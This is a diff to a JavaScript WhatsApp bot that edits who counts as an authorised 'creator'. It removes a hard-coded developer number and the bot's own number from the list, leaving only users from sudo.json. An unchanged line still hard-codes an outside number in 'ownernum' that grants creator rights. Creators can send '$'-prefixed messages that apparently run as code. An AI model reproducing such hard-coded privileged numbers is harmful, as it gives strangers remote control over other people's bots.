@@ -206,7 +206,6 @@ const port = process.env.PORT || 9090;
   const botLid = conn.user?.lid ? conn.user?.lid.split(":")[0] + "@lid" : null
   const botLid2 = botLid ? botLid.split("@")[0] : null
   const ownernum = [`272572046434350`]
-  /*const isbot = botNumber.includes(senderNumber)*/
   const isbot = (senderNumber === botNumber || (botLid2 && senderNumber === botLid2))
   const isdev = ownernum.includes(senderNumber)
   const isMe = isbot ? isbot : isdev 
@@ -233,9 +232,6 @@ const port = process.env.PORT || 9090;
     .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net') 
     .includes(sender);*/
 
-	    const udp = botNumber;
-        const devNumbers = ['94763934860'];
-        
         let sudoUsers = [];
         try {
             sudoUsers = JSON.parse(fs.readFileSync('./lib/sudo.json', 'utf-8'));
@@ -243,16 +239,10 @@ const port = process.env.PORT || 9090;
             sudoUsers = [];
         }
         
-        const authorizedUsers = [
-            udp + '@s.whatsapp.net',
-            ...devNumbers.map(n => n + '@s.whatsapp.net'),
-            config.OWNER_NUMBER + '@s.whatsapp.net',
-            ...sudoUsers
-        ].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net');
-        
-        const isCreator = authorizedUsers.includes(sender) || isMe || isOwner;
+	  const authorizedUsers = sudoUsers.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net');  
+	
+      const isCreator = authorizedUsers.includes(sender) || isMe || isOwner;
               
-
 	  if (isCreator && mek.text.startsWith("$")) {
             let code = budy.slice(2);
             if (!code) {
